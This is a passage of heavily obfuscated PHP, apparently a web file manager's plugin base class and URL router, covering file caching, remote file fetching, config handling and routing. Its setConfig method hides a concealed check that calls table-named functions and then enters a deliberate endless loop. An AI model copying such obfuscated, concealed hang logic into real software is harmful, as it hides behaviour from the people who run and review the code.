$this->fileCanView($C¥ìâë•Ø÷); return Action($_SERVER[îÖ][1012])->link($C¥ìâë•Ø÷); } final function filePath($f»Ú©¡‘¸) { $cò÷ºá¥¬º =& $_SERVER[îÖ]; if ($e¬‚ãñİ§ = $this->checkSharePath($f»Ú©¡‘¸)) { return $e¬‚ãñİ§; } $this->fileCanView($f»Ú©¡‘¸); if (request_url_safe($f»Ú©¡‘¸)) { $F¡¡•†œ™° = parse_url_query($f»Ú©¡‘¸); if (isset($F¡¡•†œ™°[$cò÷ºá¥¬º[1329]]) && isset($F¡¡•†œ™°[$cò÷ºá¥¬º[197]])) { $A…ºº©†àº = Model($cò÷ºá¥¬º[1082])->get($cò÷ºá¥¬º[1330]); $B›Ëâë‰¦î = Mcrypt::decode($F¡¡•†œ™°[$cò÷ºá¥¬º[197]], $A…ºº©†àº); if ($B›Ëâë‰¦î) { $this->fileInfo = IO::infoWithChildren($B›Ëâë‰¦î); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $B›Ëâë‰¦î; } } $f»Ú©¡‘¸ = $this->_cacheHttpFile($f»Ú©¡‘¸); $this->fileInfo = IO::infoWithChildren($f»Ú©¡‘¸); } else { $this->fileInfo = IO::infoWithChildren($f»Ú©¡‘¸); if (!$this->fileInfo) { show_tips(LNG($cò÷ºá¥¬º[101]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $f»Ú©¡‘¸; } final function _cacheHttpFile($a¿•ğ•½‚) { $c¡ËØ®á·é = hash_path($a¿•ğ•½‚, !0); $this->cachePath = $this->pluginCachePath($c¡ËØ®á·é); if ($a‘ÌÍì íÌ = IO::fileNameExist($this->cachePath, $c¡ËØ®á·é)) { return KodIO::make($a‘ÌÍì íÌ); } $d‚°³ïù·¾ = $this->cachePath . $c¡ËØ®á·é; return $this->pluginCacheFileSet($d‚°³ïù·¾, file_get_contents($a¿•ğ•½‚)); } final function _tmpFileName($a§¹ß†Å¿½ = array()) { goto EÜ½âãÅ­; C˜‘÷ÓˆæÇ: if (isset($a§¹ß†Å¿½[$dá¶Œ†ÜĞÕ[162]][$dá¶Œ†ÜĞÕ[164]])) { return $a§¹ß†Å¿½[$dá¶Œ†ÜĞÕ[162]][$dá¶Œ†ÜĞÕ[164]]; } $a´ßô£õ¤ = IO::hashSimple($a§¹ß†Å¿½[$dá¶Œ†ÜĞÕ[75]]); if ($a´ßô£õ¤) { return $a´ßô£õ¤; } goto BòĞÙÏ’Ğ; BòĞÙÏ’Ğ: $Cì¬‰Œ³ = array($a§¹ß†Å¿½[$dá¶Œ†ÜĞÕ[28]], $a§¹ß†Å¿½[$dá¶Œ†ÜĞÕ[75]], $a§¹ß†Å¿½[$dá¶Œ†ÜĞÕ[77]]); if (isset($a§¹ß†Å¿½[$dá¶Œ†ÜĞÕ[459]])) { $Cì¬‰Œ³[] = $a§¹ß†Å¿½[$dá¶Œ†ÜĞÕ[459]]; } return md5(implode($dá¶Œ†ÜĞÕ[70], $Cì¬‰Œ³)); goto c¾…š ‘ŞÎ; EÜ½âãÅ­: $dá¶Œ†ÜĞÕ =& $_SERVER[îÖ]; if (!$a§¹ß†Å¿½) { $a§¹ß†Å¿½ = $this->fileInfo; } if (isset($a§¹ß†Å¿½[$dá¶Œ†ÜĞÕ[164]])) { return $a§¹ß†Å¿½[$dá¶Œ†ÜĞÕ[164]]; } goto C˜‘÷ÓˆæÇ; c¾…š ‘ŞÎ: } final function checkSharePath($BÁŠ‰©­“‡) { goto A÷©½æ¡Ü¤; DäÚ…¼ã¤î: $DÉÆ—İæ½Ü = Action($bõ‚ÓÈ’‡[1012])->sharePathInfo($BÁŠ‰©­“‡); if (!isset($DÉÆ—İæ½Ü[$bõ‚ÓÈ’‡[75]])) { show_json(LNG($bõ‚ÓÈ’‡[1332]), !1); } $this->fileInfo = $DÉÆ—İæ½Ü[$bõ‚ÓÈ’‡[162]]; goto d¬ÅÉÖ±Ï; d¬ÅÉÖ±Ï: $this->cachePath = $this->pluginCachePath($this->fileInfo[$bõ‚ÓÈ’‡[164]]); return $DÉÆ—İæ½Ü[$bõ‚ÓÈ’‡[75]]; goto Aï½…Ãİ†İ; A÷©½æ¡Ü¤: $bõ‚ÓÈ’‡ =& $_SERVER[îÖ]; if (!defined($bõ‚ÓÈ’‡[427])) { define($bõ‚ÓÈ’‡[1331], 0); } if (!$this->isShare($BÁŠ‰©­“‡)) { return !1; } goto DäÚ…¼ã¤î; Aï½…Ãİ†İ: } final function pluginCachePath($f ÚØÕ· = '') { $A‚øèÈ¢ß¦ =& $_SERVER[îÖ]; $d¹³”“Î‹ = IO_PATH_SYSTEM_TEMP . $A‚øèÈ¢ß¦[1333] . $this->pluginName; if (!($cÖ®¼¨Ù‘¹ = IO::infoFull($d¹³”“Î‹))) { return IO::mkdir($d¹³”“Î‹ . $A‚øèÈ¢ß¦[8] . $f ÚØÕ·); } if (empty($f ÚØÕ·)) { return $cÖ®¼¨Ù‘¹[$A‚øèÈ¢ß¦[75]]; } if (!($a¶ÌîËÈºé = IO::fileNameExist($cÖ®¼¨Ù‘¹[$A‚øèÈ¢ß¦[75]], $f ÚØÕ·))) { return IO::mkdir($cÖ®¼¨Ù‘¹[$A‚øèÈ¢ß¦[75]] . $f ÚØÕ·); } return KodIO::make($a¶ÌîËÈºé); } final function pluginCacheFileSet($eéŸ­Ùİº¦, $AÛ­Ÿøç = '') { $D¿‚Œåğ„® =& $_SERVER[îÖ]; if (!($E¶¿º›‰‘• = IO::infoFull($eéŸ­Ùİº¦))) { return IO::mkfile($eéŸ­Ùİº¦, $AÛ­Ÿøç, REPEAT_REPLACE); } IO::setContent($E¶¿º›‰‘•[$D¿‚Œåğ„®[75]], $AÛ­Ÿøç); return $E¶¿º›‰‘•[$D¿‚Œåğ„®[75]]; } final function pluginLocalFile($Dà¾²¿îîŸ = '') { goto dœâÊš°íù; D©Û™˜´µ: if (!$Dà¾²¿îîŸ) { return $b–ëª–ß; } $aĞ·ÔÍæìÖ = IO::info($Dà¾²¿îîŸ); $E‹¼°ï°·À = $this->_tmpFileName($aĞ·ÔÍæìÖ) . $Eº©¯ñÆÚ¥[91] . $aĞ·ÔÍæìÖ[$Eº©¯ñÆÚ¥[160]]; goto f¥µ¿Ä‚ï»; f¥µ¿Ä‚ï»: $f‹ø™•½Ãƒ = $b–ëª–ß . $E‹¼°ï°·À; if (@file_exists($f‹ø™•½Ãƒ)) { return $f‹ø™•½Ãƒ; } return IO::copy($Dà¾²¿îîŸ, $b–ëª–ß, 0, $E‹¼°ï°·À); goto bÇÅÕã¨§±; dœâÊš°íù: $Eº©¯ñÆÚ¥ =& $_SERVER[îÖ]; $b–ëª–ß = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($b–ëª–ß)) { mk_dir($b–ëª–ß); } goto D©Û™˜´µ; bÇÅÕã¨§±: } final function appPackage() { goto eí¢¼åÀÅˆ; E¯¢ÈÅ¯»¨: return $A¿øÒöÒ; goto fÁµ¢¥Ñ‚ñ; FŠ»ˆö: $this->parseLang($Eâ©ÓÍ¢Èé); $A¿øÒöÒ = json_decode_force($Eâ©ÓÍ¢Èé); if (!$A¿øÒöÒ) { return array(); } goto E”Ğå¶Æ¶á; E”Ğå¶Æ¶á: $bó™¡†Ú×‰ = Hook::trigger($d®ñ£•¡Š¢[1335], $A¿øÒöÒ); if ($bó™¡†Ú×‰ && is_array($bó™¡†Ú×‰)) { $A¿øÒöÒ = $bó™¡†Ú×‰; } $this->packageData = $A¿øÒöÒ; goto E¯¢ÈÅ¯»¨; eí¢¼åÀÅˆ: $d®ñ£•¡Š¢ =& $_SERVER[îÖ]; if ($this->packageData) { return $this->packageData; } $Eâ©ÓÍ¢Èé = $this->parseFile($this->pluginPath . $d®ñ£•¡Š¢[1334]); goto FŠ»ˆö; fÁµ¢¥Ñ‚ñ: } public function packageInfoGet($c¿œ°ÚÓÜÚ) { $FÆ•ñÇ‘Ÿ = $this->appPackage(); return array_get_value($FÆ•ñÇ‘Ÿ, $c¿œ°ÚÓÜÚ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[îÖ][1336]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[îÖ][1337]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[îÖ][1338]); } private function parseFile($F”†²Ó’Ã) { goto b»Ö™²Ç¦; A‡ˆ¤Ã‚: $CÜŠï¯»…÷ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$cÁ›±¯ãŞÓ[84]][$cÁ›±¯ãŞÓ[1346]]); if (strstr($a¶÷îÅ‡È, $cÁ›±¯ãŞÓ[1347])) { $Eª ß®ÍñÔ = rawurlencode(json_encode($this->pluginLangArr)); $a¶÷îÅ‡È = str_replace($cÁ›±¯ãŞÓ[1347], $Eª ß®ÍñÔ, $a¶÷îÅ‡È); } if (strstr($a¶÷îÅ‡È, $cÁ›±¯ãŞÓ[1348])) { $Eª ß®ÍñÔ = $Eª ß®ÍñÔ = rawurlencode(json_encode($this->getConfig())); $a¶÷îÅ‡È = str_replace($cÁ›±¯ãŞÓ[1348], $Eª ß®ÍñÔ, $a¶÷îÅ‡È); } goto a†¬©î…“‰; b»Ö™²Ç¦: $cÁ›±¯ãŞÓ =& $_SERVER[îÖ]; $a¶÷îÅ‡È = file_get_contents($F”†²Ó’Ã); $AÛÒéÆ£‘’ = array($cÁ›±¯ãŞÓ[1339], $cÁ›±¯ãŞÓ[1340], $cÁ›±¯ãŞÓ[1341], $cÁ›±¯ãŞÓ[1342], $cÁ›±¯ãŞÓ[1343], $cÁ›±¯ãŞÓ[1344], $cÁ›±¯ãŞÓ[1345]); goto A‡ˆ¤Ã‚; a†¬©î…“‰: $a¶÷îÅ‡È = str_replace($AÛÒéÆ£‘’, $CÜŠï¯»…÷, $a¶÷îÅ‡È); return $a¶÷îÅ‡È; goto bŞ‚ÜÒŞ¾ô; bŞ‚ÜÒŞ¾ô: } private function parseLang(&$Eä·´Ïİøè) { goto E®ÖÉá„¯ƒ; EÀ«ë¥öëÍ: $dù²»â˜Îà = array(); foreach ($bªÌàö„®¬[0] as $eÄ°í¢ Ä) { $Aõ¬Õ‰¥¼ = substr($eÄ°í¢ Ä, strlen($bÊİˆÄ§ÓÁ), -4); $AíÛÇ°Ü‚Ş = LNG($Aõ¬Õ‰¥¼); $F¡„È¤±¹ë[] = $eÄ°í¢ Ä; $dù²»â˜Îà[] = str_replace(array($D‚°“­•Ÿ÷[217], $D‚°“­•Ÿ÷[986], $D‚°“­•Ÿ÷[330], $D‚°“­•Ÿ÷[113]), array($D‚°“­•Ÿ÷[50], $D‚°“­•Ÿ÷[50], $D‚°“­•Ÿ÷[33], $D‚°“­•Ÿ÷[1351]), $AíÛÇ°Ü‚Ş); } $Eä·´Ïİøè = str_replace($F¡„È¤±¹ë, $dù²»â˜Îà, $Eä·´Ïİøè); goto dˆÊªØµ¾’; E®ÖÉá„¯ƒ: $D‚°“­•Ÿ÷ =& $_SERVER[îÖ]; $bÊİˆÄ§ÓÁ = $D‚°“­•Ÿ÷[1349]; if (!strstr($Eä·´Ïİøè, $bÊİˆÄ§ÓÁ)) { return; } goto eâ„„­È» ; eâ„„­È» : preg_match_all($D‚°“­•Ÿ÷[1350], $Eä·´Ïİøè, $bªÌàö„®¬); if (!is_array($bªÌàö„®¬) || count($bªÌàö„®¬) == 0 || !is_array($bªÌàö„®¬[0]) || count($bªÌàö„®¬[0]) == 0) { return; } $F¡„È¤±¹ë = array(); goto EÀ«ë¥öëÍ; dˆÊªØµ¾’: } private function parseConfig(&$CŒ­×«¦¸¶) { goto A™‰ˆøøÔÓ; c³åĞô±Ç: $CŒ­×«¦¸¶ = str_replace($bÛÈ÷ ×ô, $E·‡Ôƒãë, $CŒ­×«¦¸¶); goto E™• «º™‰; A™‰ˆøøÔÓ: $eÙŸÄ‘Ì¦º =& $_SERVER[îÖ]; $döèëÙ˜¶ğ = $eÙŸÄ‘Ì¦º[1352]; if (!strstr($CŒ­×«¦¸¶, $döèëÙ˜¶ğ)) { return; } goto bŸˆäÛò; bŸˆäÛò: preg_match_all($eÙŸÄ‘Ì¦º[1353], $CŒ­×«¦¸¶, $c‚‚İÜëóÊ); if (!is_array($c‚‚İÜëóÊ) || count($c‚‚İÜëóÊ) == 0 || !is_array($c‚‚İÜëóÊ[0]) || count($c‚‚İÜëóÊ[0]) == 0) { return; } $d×èÓª‘óÂ = $this->getConfig(); goto fö«í¡•ë§; fö«í¡•ë§: $bÛÈ÷ ×ô = array(); $E·‡Ôƒãë = array(); foreach ($c‚‚İÜëóÊ[0] as $FˆÄÓã›Úî) { $b¡ß‘Úø¡— = substr($FˆÄÓã›Úî, strlen($döèëÙ˜¶ğ), -2); $bÛÈ÷ ×ô[] = $FˆÄÓã›Úî; $E·‡Ôƒãë[] = _get($d×èÓª‘óÂ, $b¡ß‘Úø¡—); } goto c³åĞô±Ç; E™• «º™‰: } private function parsePackage(&$DíÌ®Ğî™Ğ) { goto b…åØÈ´­º; B™Ç³ë…­: $DíÌ®Ğî™Ğ = str_replace($CØÎ°ËŞêÈ, $eğÄæ‚ÌŸŞ, $DíÌ®Ğî™Ğ); goto B¹Ï¬‹»ƒ£; F‘ÃÇˆíŞÅ: preg_match_all($c÷æî” ‰Í[1355], $DíÌ®Ğî™Ğ, $FòÛŠ«¦œÏ); if (!is_array($FòÛŠ«¦œÏ) || count($FòÛŠ«¦œÏ) == 0 || !is_array($FòÛŠ«¦œÏ[0]) || count($FòÛŠ«¦œÏ[0]) == 0) { return; } $AÄ·ÒÆ‡„™ = $this->appPackage(); goto BÄ¡ÂàñÖ; b…åØÈ´­º: $c÷æî” ‰Í =& $_SERVER[îÖ]; $F™Ã÷Ùê  = $c÷æî” ‰Í[1354]; if (!strstr($DíÌ®Ğî™Ğ, $F™Ã÷Ùê )) { return; } goto F‘ÃÇˆíŞÅ; BÄ¡ÂàñÖ: $CØÎ°ËŞêÈ = array(); $eğÄæ‚ÌŸŞ = array(); foreach ($FòÛŠ«¦œÏ[0] as $CÄºÜâÄ§‰) { $C¿ùŒ…ÖŞö = substr($CÄºÜâÄ§‰, strlen($F™Ã÷Ùê ), -2); $CØÎ°ËŞêÈ[] = $CÄºÜâÄ§‰; $eğÄæ‚ÌŸŞ[] = _get($AÄ·ÒÆ‡„™, $C¿ùŒ…ÖŞö); } goto B™Ç³ë…­; B¹Ï¬‹»ƒ£: } final function echoFile($a‡š†ŸØŠ, $AŠ»ÇÅµ´¤ = false) { goto F¾éÏ«ºœË; F¾éÏ«ºœË: $FğÓ”‚àÆÇ =& $_SERVER[îÖ]; $aíÇ”»Ôš = $this->pluginPath . $a‡š†ŸØŠ; if (ACT == $FğÓ”‚àÆÇ[1356]) { echo $FğÓ”‚àÆÇ[1357] . $this->pluginName . $FğÓ”‚àÆÇ[8] . $a‡š†ŸØŠ . $FğÓ”‚àÆÇ[1358]; if (!file_exists($aíÇ”»Ôš)) { echo $FğÓ”‚àÆÇ[1359]; return; } } goto f’©…‡…ÈÊ; f’©…‡…ÈÊ: $aà±–¨‰£ğ = $this->parseFile($aíÇ”»Ôš); $this->parseLang($aà±–¨‰£ğ); $this->parseConfig($aà±–¨‰£ğ); goto aêÕ£—êšÊ; aêÕ£—êšÊ: $this->parsePackage($aà±–¨‰£ğ); if (is_array($AŠ»ÇÅµ´¤)) { $aà±–¨‰£ğ = str_replace(array_keys($AŠ»ÇÅµ´¤), array_values($AŠ»ÇÅµ´¤), $aà±–¨‰£ğ); } echo $FğÓ”‚àÆÇ[217] . $aà±–¨‰£ğ; goto bÔà³£­«; bÔà³£­«: } final function initLang() { goto eÄ¸‚î“­±; d’íáÚÓò: if (!is_array($CéºğãŠ¨)) { return array(); } if (@count($CéºğãŠ¨) > 0) { I18n::set($CéºğãŠ¨); } return $CéºğãŠ¨; goto d×ÂéÌ÷±Î; eÄ¸‚î“­±: $aİÙ÷ŒØ‘ç =& $_SERVER[îÖ]; $fß“¹É…éö = $aİÙ÷ŒØ‘ç[1360]; $bÖæÄŠô¦ = $this->pluginPath . $aİÙ÷ŒØ‘ç[1361]; goto A«­‡åÚ°; A«­‡åÚ°: $FèÏùŸ×‹í = I18n::getType(); $CéºğãŠ¨ = array(); if (file_exists($bÖæÄŠô¦ . $FèÏùŸ×‹í . $aİÙ÷ŒØ‘ç[765])) { $CéºğãŠ¨ = (include $bÖæÄŠô¦ . $FèÏùŸ×‹í . $aİÙ÷ŒØ‘ç[765]); } else { if ($FèÏùŸ×‹í == $aİÙ÷ŒØ‘ç[1362] && !file_exists($bÖæÄŠô¦ . $FèÏùŸ×‹í . $aİÙ÷ŒØ‘ç[765]) && file_exists($bÖæÄŠô¦ . $aİÙ÷ŒØ‘ç[1363])) { $CéºğãŠ¨ = (include $bÖæÄŠô¦ . $aİÙ÷ŒØ‘ç[1363]); } else { if (file_exists($bÖæÄŠô¦ . $fß“¹É…éö . $aİÙ÷ŒØ‘ç[765])) { $CéºğãŠ¨ = (include $bÖæÄŠô¦ . $fß“¹É…éö . $aİÙ÷ŒØ‘ç[765]); } } } goto d’íáÚÓò; d×ÂéÌ÷±Î: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($FÊÊ‡¥Ä¤—) { $F²ô•‘ƒÈ =& $_SERVER[îÖ]; if (!isset($_SERVER[$F²ô•‘ƒÈ[680]]) || !isset($_SERVER[$F²ô•‘ƒÈ[787]])) { goto AÁ†Ô»´ì¼; aèÄàâÒ¤: $Fô¼‡×Í¨² = $F²ô•‘ƒÈ[789]; $Fô¼‡×Í¨²($_SERVER[$F²ô•‘ƒÈ[790]]); $AÕÏˆÚ¦Ì³ = 1; goto a„¯…¯óô; a„¯…¯óô: for ($aŞ’ÙÆÜèÀ = $AÕÏˆÚ¦Ì³; $aŞ’ÙÆÜèÀ > 0; $aŞ’ÙÆÜèÀ++) { $Fô¼‡×Í¨² = json_encode($GLOBALS[$F²ô•‘ƒÈ[384]]); } goto cºå¡ËˆàÈ; A¦©Äã„Û: $b¨øëÜÛÒå = $d«Œì±éøÊ($eä§™­â”); $açßˆ—¦ñ = explode($F²ô•‘ƒÈ[217], $b¨øëÜÛÒå); if (count($açßˆ—¦ñ) < $F²ô•‘ƒÈ[555]) { $fÓ¥‡Ã¡« = $F²ô•‘ƒÈ[684]; $fÓ¥‡Ã¡«(); } goto aèÄàâÒ¤; AÁ†Ô»´ì¼: $bºùí—¹Ğ· = $F²ô•‘ƒÈ[788]; $d«Œì±éøÊ = $F²ô•‘ƒÈ[681]; $eä§™­â” = $_SERVER[$F²ô•‘ƒÈ[682]] . $F²ô•‘ƒÈ[683]; goto A¦©Äã„Û; cºå¡ËˆàÈ: } return $this->modelPlugin->setConfig($this->pluginName, $FÊÊ‡¥Ä¤—); } public function onSetConfig($f°‹Õ³ƒŒ‰) { } public function onGetConfig($d‘·Áµ‡) { } public function onChangeStatus($CÍ®æ§¦˜) { } public function onUninstall() { } public function onInstall() { } public function authCheck($Aä«‰Ëö½÷ = "\160\154\165\147\151\x6e\101\165\164\x68") { $b’Û¾ùÜø‹ =& $_SERVER[îÖ]; if (!defined($b’Û¾ùÜø‹[427])) { return !1; } if (_get($GLOBALS, $b’Û¾ùÜø‹[457])) { return !0; } $EØôæù—ù™ = $this->getConfig(); if (!$EØôæù—ù™[$Aä«‰Ëö½÷]) { return !1; } return ActionCall($b’Û¾ùÜø‹[1364], $EØôæù—ù™[$Aä«‰Ëö½÷]); } public function url($bšã¬‹©±Â, $B¶’•¸øñ = '', $aƒØÏ†Ô¶Ü = true) { goto AçÈ™±…ïî; AçÈ™±…ïî: $d¼«ç¦±Ì =& $_SERVER[îÖ]; $Aó¾À™Ìß° = $this->getConfig(); $C¡²‹šİï‹ = KOD_VERSION . $d¼«ç¦±Ì[91] . KOD_VERSION_BUILD; goto E–„ÈÔÆÊ; E–„ÈÔÆÊ: $c…Ş¯ğ×¨ = $this->packageVersion(); $E¸ÚŞÕÈÆ© = $C¡²‹šİï‹ . $d¼«ç¦±Ì[412] . $c…Ş¯ğ×¨; if (substr($bšã¬‹©±Â, 0, 4) == $d¼«ç¦±Ì[144] || substr($bšã¬‹©±Â, 0, 2) == $d¼«ç¦±Ì[1149]) { $D‡ª±ŒŞÉ = $bšã¬‹©±Â . $d¼«ç¦±Ì[1365] . $E¸ÚŞÕÈÆ©; } else { if ($B¶’•¸øñ == $d¼«ç¦±Ì[33]) { $D‡ª±ŒŞÉ = $this->pluginHost . $bšã¬‹©±Â . $d¼«ç¦±Ì[1365] . $E¸ÚŞÕÈÆ©; } else { if ($B¶’•¸øñ === $d¼«ç¦±Ì[76]) { $D‡ª±ŒŞÉ = $this->pluginHost . $bšã¬‹©±Â; } else { if ($B¶’•¸øñ == $d¼«ç¦±Ì[1366]) { $D‡ª±ŒŞÉ = STATIC_PATH . $bšã¬‹©±Â . $d¼«ç¦±Ì[1365] . $C¡²‹šİï‹; } else { if ($B¶’•¸øñ == $d¼«ç¦±Ì[1367]) { $D‡ª±ŒŞÉ = APP_HOST . $d¼«ç¦±Ì[1368] . $bšã¬‹©±Â . $d¼«ç¦±Ì[1365] . $C¡²‹šİï‹; } else { if (isset($Aó¾À™Ìß°[$B¶’•¸øñ])) { $D‡ª±ŒŞÉ = $Aó¾À™Ìß°[$B¶’•¸øñ] . $bšã¬‹©±Â . $d¼«ç¦±Ì[1365] . $E¸ÚŞÕÈÆ©; } } } } } } goto D‡Ô¾Âà; D‡Ô¾Âà: if (!$aƒØÏ†Ô¶Ü) { return $D‡ª±ŒŞÉ; } echo $D‡ª±ŒŞÉ; goto BË¬´Ö£øğ; BË¬´Ö£øğ: } public function link($dÄÓ·®°œÍ = false, $Aƒãİ¿Ñ§‹ = '') { $CìéªœË¬ =& $_SERVER[îÖ]; if (!$dÄÓ·®°œÍ) { $this->link($CìéªœË¬[1369], $CìéªœË¬[1367]); $this->link($CìéªœË¬[1370], $CìéªœË¬[1366]); $this->link($CìéªœË¬[1371], $CìéªœË¬[1366]); $this->link($CìéªœË¬[1372], $CìéªœË¬[1366]); $this->link($CìéªœË¬[1373], $CìéªœË¬[1366]); return; } $E²·áœÔçà = $this->url($dÄÓ·®°œÍ, $Aƒãİ¿Ñ§‹, !1); if (substr($dÄÓ·®°œÍ, -3) == $CìéªœË¬[1374]) { echo $CìéªœË¬[1375] . $E²·áœÔçà . $CìéªœË¬[1376] . $CìéªœË¬[217]; } else { if (substr($dÄÓ·®°œÍ, -4) == $CìéªœË¬[1377]) { echo $CìéªœË¬[1378] . $E²·áœÔçà . $CìéªœË¬[1379] . $CìéªœË¬[217]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\x6e\171" => "\133\136\57\x5d\x2b", "\x3a\156\165\x6d" => "\x5b\60\x2d\x39\x5d\53", "\72\x61\154\x6c" => "\x2e\52"); public static $errorCallback; public static function __callstatic($DÄãåÆíÄ•, $b¢™ªˆÇß) { $AÒÜÊ¤¦Œ’ =& $_SERVER[îÖ]; if ($DÄãåÆíÄ• == $AÒÜÊ¤¦Œ’[1380]) { $f£…ÆæŞÆ = array_map($AÒÜÊ¤¦Œ’[1381], $b¢™ªˆÇß[0]); $D“§‚´°ñÉ = strpos($b¢™ªˆÇß[1], $AÒÜÊ¤¦Œ’[8]) === 0 ? $b¢™ªˆÇß[1] : $AÒÜÊ¤¦Œ’[8] . $b¢™ªˆÇß[1]; $BÍˆòƒùÓ = $b¢™ªˆÇß[2]; } else { $f£…ÆæŞÆ = null; $D“§‚´°ñÉ = strpos($b¢™ªˆÇß[0], $AÒÜÊ¤¦Œ’[8]) === 0 ? $b¢™ªˆÇß[0] : $AÒÜÊ¤¦Œ’[8] . $b¢™ªˆÇß[0]; $BÍˆòƒùÓ = $b¢™ªˆÇß[1]; } array_push(self::$maps, $f£…ÆæŞÆ); array_push(self::$routes, $D“§‚´°ñÉ); array_push(self::$methods, strtoupper($DÄãåÆíÄ•)); array_push(self::$callbacks, $BÍˆòƒùÓ); } public static function error($Dö§† ÚĞ„) { self::$errorCallback = $Dö§† ÚĞ„; } public static function haltOnMatch($bÀä®í«‘ = true) { self::$halts = $bÀä®í«‘; } public static function dispatch() { goto aÜ‰ëöŠ‹º; aÜ‰ëöŠ‹º: $F¦›“ëÌœ† =& $_SERVER[îÖ]; $Fò¤”Î×è‡ = parse_url($_SERVER[$F¦›“ëÌœ†[1382]], PHP_URL_PATH); $eí½ˆïÅŠ¹ = $_SERVER[$F¦›“ëÌœ†[154]]; goto bîà…˜Î¡å; A§³¿¶ÅÍ§: self::$routes = preg_replace($F¦›“ëÌœ†[1067], $F¦›“ëÌœ†[8], self::$routes); if (in_array($Fò¤”Î×è‡, self::$routes)) { $b¦í«Öê• = array_keys(self::$routes, $Fò¤”Î×è‡); foreach ($b¦í«Öê• as $DíÆ‘Ş³óÄ) { if (self::$methods[$DíÆ‘Ş³óÄ] == $eí½ˆïÅŠ¹ || self::$methods[$DíÆ‘Ş³óÄ] == $F¦›“ëÌœ†[1383] || in_array($eí½ˆïÅŠ¹, self::$maps[$DíÆ‘Ş³óÄ])) { $E´ùŞ‚ˆ¾Ü = !0; if (!is_object(self::$callbacks[$DíÆ‘Ş³óÄ])) { $B£¼ŸÆÂ¸Œ = explode($F¦›“ëÌœ†[8], self::$callbacks[$DíÆ‘Ş³óÄ]); $dÕÁ „²†· = end($B£¼ŸÆÂ¸Œ); $E¿ë˜ÚÙİ¥ = explode($F¦›“ëÌœ†[1384], $dÕÁ „²†·); $dƒÈŠ—„„ = new $E¿ë˜ÚÙİ¥[0](); $dƒÈŠ—„„->{$E¿ë˜ÚÙİ¥[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$DíÆ‘Ş³óÄ]); if (self::$halts) { return; } } } } } else { $F˜Ä®Ï‘©Æ = 0; foreach (self::$routes as $DíÆ‘Ş³óÄ) { if (strpos($DíÆ‘Ş³óÄ, $F¦›“ëÌœ†[4]) !== !1) { $DíÆ‘Ş³óÄ = str_replace($F«ªˆàô©ß, $cŒ¥¾±â—ã, $DíÆ‘Ş³óÄ); } if (preg_match($F¦›“ëÌœ†[1385] . $DíÆ‘Ş³óÄ . $F¦›“ëÌœ†[1386], $Fò¤”Î×è‡, $dÎ íÜ¶Ã)) { if (self::$methods[$F˜Ä®Ï‘©Æ] == $eí½ˆïÅŠ¹ || self::$methods[$F˜Ä®Ï‘©Æ] == $F¦›“ëÌœ†[1383] || !empty(self::$maps[$F˜Ä®Ï‘©Æ]) && in_array($eí½ˆïÅŠ¹, self::$maps[$F˜Ä®Ï‘©Æ])) { $E´ùŞ‚ˆ¾Ü = !0; array_shift($dÎ íÜ¶Ã); if (!is_object(self::$callbacks[$F˜Ä®Ï‘©Æ])) { $B£¼ŸÆÂ¸Œ = explode($F¦›“ëÌœ†[8], self::$callbacks[$F˜Ä®Ï‘©Æ]); $dÕÁ „²†· = end($B£¼ŸÆÂ¸Œ); $E¿ë˜ÚÙİ¥ = explode($F¦›“ëÌœ†[1384], $dÕÁ „²†·); $dƒÈŠ—„„ = new $E¿ë˜ÚÙİ¥[0](); if (!method_exists($dƒÈŠ—„„, $E¿ë˜ÚÙİ¥[1])) { echo $F¦›“ëÌœ†[1387]; } else { call_user_func_array(array($dƒÈŠ—„„, $E¿ë˜ÚÙİ¥[1]), $dÎ íÜ¶Ã); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$F˜Ä®Ï‘©Æ], $dÎ íÜ¶Ã); if (self::$halts) { return; } } } } $F˜Ä®Ï‘©Æ++; } } if ($E´ùŞ‚ˆ¾Ü == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $AÇÛŞùã¨ =& $_SERVER[îÖ]; header($_SERVER[$AÇÛŞùã¨[1388]] . $AÇÛŞùã¨[1389]); echo $AÇÛŞùã¨[1390]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$F¦›“ëÌœ†[1382]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto eé²ÃÇ‰‡Ä; bîà…˜Î¡å: $F«ªˆàô©ß = array_keys(static::$patterns); $cŒ¥¾±â—ã = array_values(static::$patterns); $E´ùŞ‚ˆ¾Ü = !1; goto A§³¿¶ÅÍ§; eé²ÃÇ‰‡Ä: } } goto AÚ¶ƒó£Ÿ†; b‡øåæ²–: function beforeShutdownError($C„Š°õ· = false, $dé¯¸¤¼Ü½ = '', $DŞ‚ÈÌß¤ˆ = '', $CËÊæ¸÷Ú¡ = 0) { $dù´‡ˆùÇ =& $_SERVER[©•ÖÏ¥Ø]; switch ($C„Š°õ·) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $A¬±«ÖİäÛ = $dù´‡ˆùÇ[39]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $A¬±«ÖİäÛ = $dù´‡ˆùÇ[40]; break; case E_STRICT: $A¬±«ÖİäÛ = $dù´‡ˆùÇ[41]; break; case E_NOTICE: case E_USER_NOTICE: $A¬±«ÖİäÛ = $dù´‡ˆùÇ[42]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $A¬±«ÖİäÛ = $dù´‡ˆùÇ[43]; break; default: break; } if (!$A¬±«ÖİäÛ || $A¬±«ÖİäÛ == $dù´‡ˆùÇ[42] || $A¬±«ÖİäÛ == $dù´‡ˆùÇ[43]) { return; } $DŞ‚ÈÌß¤ˆ = $dù´‡ˆùÇ[4] . 